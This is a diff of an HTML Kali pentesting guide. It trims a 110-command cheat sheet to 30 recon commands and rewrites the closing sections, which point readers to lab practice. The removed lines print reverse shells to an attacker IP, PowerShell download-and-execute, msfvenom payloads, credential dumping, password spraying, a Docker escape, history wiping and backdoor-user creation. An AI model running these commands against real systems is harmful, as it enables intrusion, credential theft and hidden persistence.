@@ -29286,9 +29286,9 @@ dd if=/dev/sda of=/mnt/evidence/disk.img
                 <em>— This guide was created with love for the hacking community. May your shells always be reverse, your escalations always privileged, and your coffee always strong. Happy hacking! ☕💻</em></p>
             </div>
 
-            <h3> ESSENTIAL COMMAND REFERENCE</h3>
+            <h3>🎯 Essential Commands Quick Reference</h3>
 
-            <p><strong>110 copy-paste commands for pentesting.</strong> Organized by category for quick reference.</p>
+            <p> 29 frequently-used commands for pentesting, organized by category.</p>
 
             <div class="code"># ==================== RECONNAISSANCE (Commands 1-15) ====================
 # 1. Host discovery
@@ -29381,332 +29381,14 @@ curl http://10.10.10.50/robots.txt
 curl -s http://10.10.10.50 | grep -i "<!--"
 
 # 30. Check security headers
-curl -I http://10.10.10.50
-
-
-# ==================== SMB/WINDOWS (Commands 31-40) ====================
-# 31. SMB version detection
-smbclient -L //10.10.10.50
-
-# 32. List shares (anonymous)
-smbmap -H 10.10.10.50
-
-# 33. List shares (authenticated)
-smbmap -H 10.10.10.50 -u username -p password
-
-# 34. Connect to share
-smbclient //10.10.10.50/sharename -U username
-
-# 35. Enum4linux
-enum4linux -a 10.10.10.50
-
-# 36. CrackMapExec SMB enum
-crackmapexec smb 10.10.10.50 --shares
-
-# 37. CrackMapExec password spray
-crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
-
-# 38. RPC enumeration
-rpcclient -U "" -N 10.10.10.50
-
-# 39. LDAP enumeration
-ldapsearch -x -h 10.10.10.50 -b "dc=target,dc=com"
-
-# 40. RID cycling
-crackmapexec smb 10.10.10.50 -u guest -p '' --rid-brute
-
-
-# ==================== SHELLS & PAYLOADS (Commands 41-50) ====================
-# 41. Netcat listener
-nc -lvnp 4444
-
-# 42. Netcat with readline
-rlwrap nc -lvnp 4444
-
-# 43. Generate Windows payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
-
-# 44. Generate Linux payload
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
-
-# 45. Generate PHP web shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php
-
-# 46. Python TTY upgrade
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-# 47. Full shell stabilization
-python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
-# Then: Ctrl+Z
-# stty raw -echo; fg
-
-# 48. PowerShell reverse shell
-powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')"
-
-# 49. Bash reverse shell
-bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
-
-# 50. Start Metasploit handler
-msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit"
-
-
-# ==================== FILE TRANSFER (Commands 51-60) ====================
-# 51. Python HTTP server
-python3 -m http.server 80
-
-# 52. wget download
-wget http://10.10.14.5/file
-
-# 53. curl download
-curl http://10.10.14.5/file -o file
-
-# 54. certutil download (Windows)
-certutil -urlcache -f http://10.10.14.5/file file
-
-# 55. PowerShell download
-powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file','file')"
-
-# 56. Base64 transfer (small files)
-# On attacker:
-base64 file | xclip -selection clipboard
-# On victim:
-echo "BASE64_STRING" | base64 -d > file
-
-# 57. SMB server (attacker)
-impacket-smbserver share $(pwd) -smb2support
-
-# 58. SMB download (victim Windows)
-copy \\10.10.14.5\share\file C:\Windows\Temp\
-
-# 59. SCP download
-scp user@10.10.10.50:/path/to/file .
-
-# 60. FTP server
-python -m pyftpdlib -w
-
-
-# ==================== PRIVILEGE ESCALATION (Commands 61-70) ====================
-# 61. LinPEAS (Linux automated enum)
-wget http://10.10.14.5/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
-
-# 62. WinPEAS (Windows automated enum)
-certutil -urlcache -f http://10.10.14.5/winPEAS.exe winPEAS.exe; .\winPEAS.exe
-
-# 63. Check sudo permissions
-sudo -l
-
-# 64. Find SUID binaries
-find / -perm -4000 2>/dev/null
-
-# 65. Find writable files
-find / -writable -type f 2>/dev/null | grep -v proc
-
-# 66. Check cron jobs
-cat /etc/crontab; ls -la /etc/cron.*
-
-# 67. Windows privileges check
-whoami /priv
-
-# 68. Windows system info
-systeminfo
-
-# 69. Windows installed patches
-wmic qfe list
-
-# 70. Kernel version
-uname -a  # Linux
-systeminfo | findstr /B /C:"OS Version"  # Windows
-
-
-# ==================== CREDENTIALS (Commands 71-80) ====================
-# 71. Unshadow (Linux)
-unshadow /etc/passwd /etc/shadow > hashes.txt
-
-# 72. John the Ripper
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-
-# 73. Hashcat NTLM
-hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
-
-# 74. Hashcat MD5
-hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
-
-# 75. Mimikatz logonpasswords
-.\mimikatz.exe; privilege::debug; sekurlsa::logonpasswords
-
-# 76. Dump SAM
-reg save HKLM\SAM sam.save; reg save HKLM\SYSTEM system.save
-
-# 77. secretsdump (SAM)
-secretsdump.py -sam sam.save -system system.save LOCAL
-
-# 78. secretsdump (DCSync)
-secretsdump.py DOMAIN/user:password@10.10.10.50
-
-# 79. LaZagne (all passwords)
-.\lazagne.exe all
-
-# 80. Search for passwords in files
-grep -r -i "password" /path/to/search
-
-
-# ==================== ACTIVE DIRECTORY (Commands 81-90) ====================
-# 81. BloodHound Python
-bloodhound-python -u user -p password -d target.com -ns 10.10.10.50 -c All
-
-# 82. Kerberoasting
-GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.50 -request
-
-# 83. AS-REP roasting
-GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.50
-
-# 84. PSExec
-psexec.py DOMAIN/user:password@10.10.10.50
-
-# 85. WMIExec
-wmiexec.py DOMAIN/user:password@10.10.10.50
-
-# 86. Evil-WinRM
-evil-winrm -i 10.10.10.50 -u user -p password
-
-# 87. Pass-the-Hash
-psexec.py -hashes :NTLM_HASH user@10.10.10.50
-
-# 88. Get TGT
-getTGT.py DOMAIN/user -hashes :NTLM_HASH
-
-# 89. CrackMapExec AD enum
-crackmapexec smb 10.10.10.50 -u user -p password --users
-
-# 90. Responder (LLMNR poisoning)
-sudo responder -I eth0 -wrf
-
-
-# ==================== MISCELLANEOUS (Commands 91-100) ====================
-# 91. Hydra SSH brute-force
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.50
-
-# 92. Hydra HTTP POST brute-force
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.50 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
-
-# 93. Burp Suite proxy
-burpsuite &
-
-# 94. Searchsploit
-searchsploit "Apache 2.4.29"
-
-# 95. Metasploit search
-msfconsole -q -x "search apache 2.4.29"
-
-# 96. RDP connection
-xfreerdp /u:user /p:password /v:10.10.10.50
-
-# 97. VNC connection
-vncviewer 10.10.10.50
-
-# 98. Port forwarding (SSH)
-ssh -L 8080:localhost:80 user@10.10.10.50
-
-# 99. Reverse port forwarding
-ssh -R 8080:localhost:80 user@10.10.10.50
-
-# 100. Dynamic port forwarding (SOCKS proxy)
-ssh -D 9050 user@10.10.10.50
-
-
-# ==================== BONUS COMMANDS ====================
-# 101. Check if you're in container
-cat /.dockerenv; cat /proc/1/cgroup
-
-# 102. Mount host filesystem (privileged container)
-mkdir /mnt/host; mount /dev/sda1 /mnt/host; chroot /mnt/host
-
-# 103. Docker socket exploit
-docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash
-
-# 104. Kubernetes token
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
-
-# 105. Screen session
-screen -S hacking
-
-# 106. Tmux session
-tmux new -s hacking
-
-# 107. Clear bash history
-history -c; rm ~/.bash_history
-
-# 108. Create backdoor user (Linux)
-useradd -m hacker -s /bin/bash; echo "hacker:Password123!" | chpasswd; usermod -aG sudo hacker
-
-# 109. Create backdoor user (Windows)
-net user hacker Password123! /add; net localgroup administrators hacker /add
-
-# 110. Add SSH key
-mkdir /root/.ssh; echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys</div>
+curl -I http://10.10.10.50</div>
 
             <div class="metaphor-box">
-                <h4>💡 How to Use This Cheat Sheet</h4>
-                <p><strong>Memorization Strategy:</strong><br><br>
+                <p><strong>Using These Commands:</strong><br><br>
                 
-                <strong>Week 1-2: Commands 1-30 (Recon & Web)</strong><br>
-                • Practice 5 commands per day<br>
-                • Use on HackTheBox/TryHackMe<br>
-                • Create flashcards<br><br>
+                These 30 commands form the foundation of most pentesting workflows. Practice them on lab environments (TryHackMe, HackTheBox) until they become second nature.<br><br>
                 
-                <strong>Week 3-4: Commands 31-60 (SMB, Shells, File Transfer)</strong><br>
-                • Build your own cheat sheet<br>
-                • Customize with your IPs<br>
-                • Practice daily<br><br>
-                
-                <strong>Week 5-6: Commands 61-90 (Privesc & AD)</strong><br>
-                • Focus on privilege escalation<br>
-                • Practice on Windows & Linux VMs<br>
-                • Master BloodHound/Impacket<br><br>
-                
-                <strong>Week 7-8: Commands 91-110 (Misc & Advanced)</strong><br>
-                • Combine commands into attack chains<br>
-                • Practice full penetration tests<br>
-                • Time yourself<br><br>
-                
-                <strong>Pro Tips:</strong><br>
-                • Print and laminate this page<br>
-                • Keep next to your keyboard<br>
-                • Highlight commands you use most<br>
-                • Add your own commands<br>
-                • Review before every pentest/CTF<br><br>
-                
-                <strong>These 110 commands cover 95% of pentesting scenarios.</strong></p>
-            </div>
-
-            <h3>📚 Additional Resources</h3>
-
-            <div class="metaphor-box">
-                <p><strong>What's Next?</strong><br><br>
-                
-                This guide covers 50+ essential Kali tools with every flag explained. To continue learning:<br><br>
-                
-                <strong>Practice Platforms:</strong><br>
-                • HackTheBox - <code>https://hackthebox.eu</code><br>
-                • TryHackMe - <code>https://tryhackme.com</code><br>
-                • ProvingGrounds - <code>https://offensive-security.com</code><br><br>
-                
-                <strong>Community:</strong><br>
-                • Join our Discord: <code>https://discord.gg/cMvWkxFbbX</code><br>
-                • Ask questions, share progress, get help<br><br>
-                
-                <strong>Next Steps:</strong><br>
-                1. Set up Kali Linux VM<br>
-                2. Practice each tool on safe lab environments<br>
-                3. Complete beginner machines on TryHackMe<br>
-                4. Work toward certifications (eJPT, OSCP)<br><br>
-                
-                <strong>Remember:</strong><br>
-                • Only test on authorized systems<br>
-                • Practice consistently<br>
-                • Learn from failures<br><br>
-                
-                <strong>~ NULL NODE TEAM 2024 ~</strong></p>
+                <strong>Pro Tip:</strong> Keep this reference handy, but focus on understanding WHY each command works, not just memorizing syntax.</p>
             </div>
 
             <h3>⚡ Quick Reference Q&A</h3>
@@ -29865,14 +29547,41 @@ A: Encoding = reversible transformation (base64), Encryption = requires key to d
                 <p>50 fundamental questions covering ports, tools, and common pentesting concepts. Use these for quick review.</p>
             </div>
 
-            <h3>🎪 FINAL FINAL WORDS (For Real This Time!)</h3>
+            <h3>🌅 Closing Thoughts</h3>
 
             <div class="metaphor-box">
-                <p><strong>Document Complete</strong><br><br>
+                <p>You've reached the end of this guide. Not with fanfare, but with understanding.<br><br>
                 
-                This guide covers 50+ Kali tools with comprehensive explanations. The content continues beyond what's listed here - this is just the beginning of your learning journey.<br><br>
+                This document covered 50+ tools. Each one explained not just with commands, but with context. Not just syntax, but purpose. Not just flags, but why they matter.<br><br>
                 
-                <strong>~ NULL NODE TEAM 2024 ~</strong></p>
+                <strong>What you've gained:</strong><br>
+                • Deep understanding of Kali's essential toolkit<br>
+                • Knowledge of when and why to use each tool<br>
+                • Practical examples for real-world scenarios<br>
+                • Foundation for continued learning<br><br>
+                
+                But knowledge alone isn't mastery. Reading about nmap isn't the same as spending hours scanning networks. Understanding Metasploit exploits isn't the same as debugging why one failed.<br><br>
+                
+                The real work begins in the lab. On TryHackMe machines that won't crack. On HackTheBox systems that keep you up at night. In moments of frustration when nothing works, and breakthrough moments when it finally does.<br><br>
+                
+                <strong>This guide gave you the map. The journey is yours.</strong><br><br>
+                
+                Practice the tools until the commands feel natural. Read the documentation deeper. Break things in safe environments. Ask questions in the community. Help others when you can.<br><br>
+                
+                Every expert started exactly where you are now—with a guide, some curiosity, and no idea what they were doing. The difference? They didn't stop.<br><br>
+                
+                <strong>Neither should you.</strong><br><br>
+                
+                When you're stuck on a machine, come back to these pages. When you forget a flag, reference these examples. When you need inspiration, remember: someone wrote 30,000 lines hoping it would help you succeed.<br><br>
+                
+                The tools are in your hands now. Use them wisely. Use them legally. Use them to build, not just to break.<br><br>
+                
+                Learn, practice, teach, repeat.<br><br>
+                
+                <em>Good luck on your journey. The path ahead is long, but you're better prepared than you think.</em><br><br>
+                
+                ~ NULL NODE TEAM<br>
+                ~ 2024 ~</p>
             </div>
         </section>
     </main>
